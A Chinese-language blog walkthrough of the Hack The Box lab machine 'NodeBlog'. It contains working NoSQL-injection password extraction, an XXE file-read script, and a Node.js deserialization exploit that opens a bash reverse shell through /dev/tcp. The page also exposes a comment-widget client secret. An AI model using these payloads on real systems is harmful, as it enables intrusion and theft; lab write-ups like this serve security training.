<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>NodeBlog - Hackthebox | Lucifiel&#39;s Blog | Lucifiel æŠ€æœ¯åšå®¢</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - NodeBlogé¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›† â”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.139   Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-19 20:19 E">
<meta property="og:type" content="article">
<meta property="og:title" content="NodeBlog - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - NodeBlogé¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›† â”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.139   Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-19 20:19 E">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/e297979a-da6d-479f-8a33-6ad064a70524.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/9e9f1641-f841-4113-b811-a3716dded36b.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/1e8775e6-d854-411a-b335-6a916ddcce3a.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/aacd32a4-2b3b-4423-a25d-b675844deed8.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/1a838379-db7b-4bcf-8950-9ca63d0332b9.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/400836e5-187f-407c-a39b-bcc75034975b.png">
<meta property="article:published_time" content="2022-01-10T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-17T02:21:13.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/e297979a-da6d-479f-8a33-6ad064a70524.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                ä¸»é¡µ
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/lucifiel" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                è¯·æˆ‘å–å’–å•¡
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">NodeBlog - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="è¾“å…¥æ„Ÿå…´è¶£çš„å…³é”®å­—">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">NodeBlog - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-01-10T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2022-01-10
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-NodeBlog"><span class="post-toc-text">Hackthebox - NodeBlog</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#é¶åœºä¿¡æ¯"><span class="post-toc-text">é¶åœºä¿¡æ¯</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#é¶åœºç±»å‹"><span class="post-toc-text">é¶åœºç±»å‹</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ä¿¡æ¯æœé›†"><span class="post-toc-text">ä¿¡æ¯æœé›†</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#æ¼æ´åˆ©ç”¨"><span class="post-toc-text">æ¼æ´åˆ©ç”¨</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-NodeBlog"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">NodeBlog - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-01-10 19:38:36" datetime="2022-01-10T11:38:36.000Z"  itemprop="datePublished">2022-01-10</time>

            


            
<span id="busuanzi_container_page_pv" title="æ–‡ç« æ€»é˜…è¯»é‡" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-NodeBlog"><a href="#Hackthebox-NodeBlog" class="headerlink" title="Hackthebox - NodeBlog"></a>Hackthebox - NodeBlog</h1><h2 id="é¶åœºä¿¡æ¯"><a href="#é¶åœºä¿¡æ¯" class="headerlink" title="é¶åœºä¿¡æ¯"></a>é¶åœºä¿¡æ¯</h2><img src="/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/e297979a-da6d-479f-8a33-6ad064a70524.png" class title="image">

<h2 id="é¶åœºç±»å‹"><a href="#é¶åœºç±»å‹" class="headerlink" title="é¶åœºç±»å‹"></a>é¶åœºç±»å‹</h2><img src="/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/9e9f1641-f841-4113-b811-a3716dded36b.png" class title="image">

<h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›†</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.139  
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-19 20:19 EST
Nmap scan report for 10.10.11.139
Host is up (0.23s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/19%OT=22%CT=1%CU=34477%PV=Y%DS=2%DC=T%G=Y%TM=61E8B8C
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:00%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O
OS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   221.92 ms 10.10.14.1
2   222.21 ms 10.10.11.139

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.53 seconds
</code></pre>
<p>å»çœ‹ä¸€ä¸‹5000ç«¯å£</p>
<img src="/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/1e8775e6-d854-411a-b335-6a916ddcce3a.png" class title="image">

<p>å»çœ‹çœ‹ç™»é™†å¤„</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl 10.10.11.139:5000/login -sd &#39;{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123&quot;}&#39; -H &#39;Content-Type: application/json&#39; | grep Invalid
            Invalid Password
</code></pre>
<p>ä½¿ç”¨è´¦å·adminæç¤ºå¯†ç æ— æ•ˆ</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl 10.10.11.139:5000/login -sd &#39;{&quot;user&quot;:&quot;admin1&quot;,&quot;password&quot;:&quot;123&quot;}&#39; -H &#39;Content-Type: application/json&#39; | grep Invalid
            Invalid Username
</code></pre>
<p>ä½¿ç”¨è´¦å·admin1æç¤ºè´¦å·æ— æ•ˆ</p>
<p>å¾—å‡ºç»“è®ºï¼šè¿™é‡Œå¯ä»¥çˆ†ç ´è´¦å·</p>
<p>ä½†æ˜¯fuzzåæ²¡æœ‰å‘ç°å¯ä»¥å…¶ä»–è´¦å·ï¼Œä¹Ÿæ²¡æœ‰çˆ†ç ´è¿›å»</p>
<p>æ¥ç€æµ‹è¯•ä¸€ä¸‹æ˜¯å¦æœ‰å…¶ä»–æ¼æ´ï¼Œä¾‹å¦‚æ³¨å…¥</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl 10.10.11.139:5000/login -isd &#39;{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;&quot;}}&#39; -H &#39;Content-Type: application/json&#39;
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D; Max-Age=900; Path=/; Expires=Thu, 20 Jan 2022 10:27:09 GMT; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 2589
ETag: W/&quot;a1d-JGrC4mhnlEApoTWWPEhYOlLd+UA&quot;
Date: Thu, 20 Jan 2022 10:12:09 GMT
Connection: keep-alive
Keep-Alive: timeout=5
</code></pre>
<p>å°è¯•äº†ä¸€ä¸‹regexæ³¨å…¥ï¼Œç¡®è®¤æ˜¯å¯ä»¥å¹¶ä¸”å­˜åœ¨nosqlæ³¨å…¥çš„</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>é¦–å…ˆå»ç¡®å®šä¸€ä¸‹adminè´¦æˆ·æ‰€ä½¿ç”¨å¯†ç çš„é•¿åº¦</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl 10.10.11.139:5000/login -isd &#39;{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;^.{24}$&quot;}}&#39; -H &#39;Content-Type: application/json&#39; | grep Invalid 
            Invalid Password

â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl 10.10.11.139:5000/login -isd &#39;{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;^.{25}$&quot;}}&#39; -H &#39;Content-Type: application/json&#39; | grep Invalid
</code></pre>
<p>æˆåŠŸç¡®å®šå¯†ç çš„ä½æ•°ä¸º25ä½</p>
<p>å¯ä»¥ä½¿ç”¨regexæ­£åˆ™åŒ¹é…ä¸€ä¸ªä¸€ä¸ªç¡®è®¤å¯†ç æ˜¯å•¥ï¼Œä¸è¿‡å†…å®¹å¤ªç¹çäº†ï¼Œè¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªè„šæœ¬ï¼Œç›´æ¥ä½¿ç”¨è„šæœ¬è¿›è¡Œåˆ©ç”¨</p>
<pre><code class="bash">#!/usr/bin/env bash

url=10.10.11.139:5000/login
user=admin

function do_nosqli() {
    curl $url -H &#39;Content-Type: application/json&#39; -sd $1 | grep Invalid
}

while true; do
    data=&#39;{&quot;user&quot;:&quot;&#39;$user&#39;&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;^.{&#39;$password_length&#39;}$&quot;}}&#39;
    echo -ne &quot;Password length: $password_length\r&quot;

    if [ -z &quot;$(do_nosqli &quot;$data&quot;)&quot; ]; then
        break
    fi

    password_length=$((password_length + 1))
done

echo

for i in $(seq 1 $password_length); do
    echo -ne &quot;Password: $password\r&quot;

    for c in {A..Z} {a..z} {0..9}; do
        data=&#39;{&quot;user&quot;:&quot;&#39;$user&#39;&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;^&#39;$password$c&#39;.{&#39;$(($password_length - $i))&#39;}$&quot;}}&#39;

        if [ -z &quot;$(do_nosqli $data)&quot; ]; then
            password+=$c
            break
        fi
    done
done

echo
</code></pre>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# bash nosqli.sh
Password length: 25
Password: IppsecSaysPleaseSubscribe
</code></pre>
<p>æˆåŠŸæ‹¿åˆ°è´¦å·å¯†ç ï¼Œå»åå°ç™»å½•</p>
<img src="/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/aacd32a4-2b3b-4423-a25d-b675844deed8.png" class title="image">

<p>æˆåŠŸç™»å½•</p>
<pre><code class="bash">Error: Failed to lookup view &quot;articles/${path}&quot; in views directory &quot;/opt/blog/views&quot;
    at Function.render (/opt/blog/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/opt/blog/node_modules/express/lib/response.js:1012:7)
    at /opt/blog/routes/articles.js:81:17
    at processTicksAndRejections (internal/process/task_queues.js:95:5)
</code></pre>
<p>å°è¯•åˆ›å»ºä¸€ç¯‡æ–°æ–‡ç« æ—¶æŠ¥é”™</p>
<pre><code class="bash">Invalid XML Example: Example DescriptionExample Markdown
</code></pre>
<p>ä¸Šä¼ æ–°æ–‡ä»¶æ—¶æç¤ºæ— æ•ˆçš„XMLç¤ºä¾‹</p>
<p>ç°åœ¨æ¢³ç†ä¸€ä¸‹æˆ‘ä»¬æ‹¥æœ‰çš„æ¡ä»¶</p>
<ol>
<li>çŸ¥é“ç¨‹åºçš„ç»å¯¹è·¯å¾„åœ¨&#x2F;opt&#x2F;blog</li>
<li>éœ€è¦ä¸Šä¼ ä¸€ä¸ªæ­£ç¡®çš„XMLç¤ºä¾‹</li>
</ol>
<p>é‚£å’±ä»¬å°±æ¥æ„é€ ä¸€ä¸ªå§</p>
<pre><code class="bash">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;post&gt;
  &lt;title&gt;Lucifiel&lt;/title&gt;
  &lt;description&gt;&lt;/description&gt;  
  &lt;markdown&gt;&lt;/markdown&gt;
&lt;/post&gt;
</code></pre>
<img src="/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/1a838379-db7b-4bcf-8950-9ca63d0332b9.png" class title="image">

<p>ä¸Šä¼ è¯¥xmlæ–‡ä»¶ä¼šè·³è½¬åˆ°ç¼–å†™æ–°æ–‡ç« </p>
<pre><code class="bash">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;  
&lt;post&gt;
  &lt;title&gt;Lucifiel&lt;/title&gt;
  &lt;description&gt;&amp;xxe;&lt;/description&gt;
  &lt;markdown&gt;&lt;/markdown&gt;
&lt;/post&gt;
</code></pre>
<img src="/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/400836e5-187f-407c-a39b-bcc75034975b.png" class title="image">

<p>æˆåŠŸæ‰§è¡ŒXXE</p>
<p>ç”¨ä¸€ä¸ªpythonè„šæœ¬æ¥æ‰§è¡Œä»»æ„æ–‡ä»¶è¯»å–</p>
<pre><code class="python">#!/usr/bin/env python3

import html
import re
import requests
import sys

def send_xml(filename):
    xml = f&#39;&#39;&#39;&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file://{filename}&quot;&gt; ]&gt;
&lt;example&gt;
  &lt;title&gt;&lt;/title&gt;
  &lt;description&gt;&amp;xxe;&lt;/description&gt;
  &lt;markdown&gt;&lt;/markdown&gt;
&lt;/example&gt;
&#39;&#39;&#39;

    res = requests.post(&#39;http://10.10.11.139:5000/articles/xml&#39;, files={&#39;file&#39;: (&#39;test.xml&#39;, xml)})

    return res.text

def main():
    if len(sys.argv) == 1:
        print(f&#39;Usage: python3 {sys.argv[0]} &lt;filename&gt;&#39;)
        exit(1)

    filename = sys.argv[1]
    xml = send_xml(filename)

    try:
        print(html.unescape(re.findall(r&#39;&lt;textarea.*?&gt;(.*?)&lt;/textarea&gt;&#39;, xml, re.DOTALL)[0]))
    except IndexError:
        print(&#39;Not Found&#39;)

if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<p>æ‰¾åˆ°äº†ä¸€ä¸ªåˆ©ç”¨è„šæœ¬</p>
<pre><code class="javascript">#!/usr/bin/env node

const axios = require(&#39;axios&#39;)

const user = &#39;admin&#39;
const password = &#39;IppsecSaysPleaseSubscribe&#39;
const baseUrl = &#39;http://10.10.11.139:5000&#39;

const [lhost, lport] = process.argv.slice(2, 4)

const login = async () =&gt; {
  const res = await axios.post(`${baseUrl}/login`, { user, password })

  return res.headers[&#39;set-cookie&#39;][0]
}

const rce = async (cookie, cmd) =&gt; {
  const paramIndex = cookie.indexOf(&#39;;&#39;)

  cookie =
    cookie.substring(0, paramIndex - 3) +
    encodeURIComponent(
      `,&quot;rce&quot;:&quot;_$$ND_FUNC$$_function() { require(&#39;child_process&#39;).exec(&#39;${cmd}&#39;) }()&quot;}`
    ) +
    cookie.substring(paramIndex)

  await axios.get(baseUrl, { headers: { cookie } })
}

const reverseShell = () =&gt;
  Buffer.from(`bash  -i &gt;&amp; /dev/tcp/${lhost}/${lport} 0&gt;&amp;1`).toString(&#39;base64&#39;)

const main = async () =&gt; {
  if (!lhost || !lport) {
    console.log(&#39;[!] Usage: node serialize-rce.js &lt;lhost&gt; &lt;lport&gt;&#39;)
    process.exit()
  }

  const cookie = await login()
  console.log(&#39;[+] Login successful&#39;)

  await rce(cookie, `echo ${reverseShell()} | base64 -d | bash`)
  console.log(&#39;[+] RCE completed&#39;)
}

main()
</code></pre>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/&title=ã€ŠNodeBlog - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/&title=ã€ŠNodeBlog - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠNodeBlog - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2022/01/17/Hackthebox/Medium/Hackthebox-Bolt/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Bolt - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/01/08/Hackthebox/Easy/Hackthebox-Pandora/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Pandora - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        ç«™ç‚¹æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        ç«™ç‚¹æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2025</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/&title=ã€ŠNodeBlog - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/&title=ã€ŠNodeBlog - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠNodeBlog - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>æ‰«ä¸€æ‰«ï¼Œåˆ†äº«åˆ°å¾®ä¿¡</p>
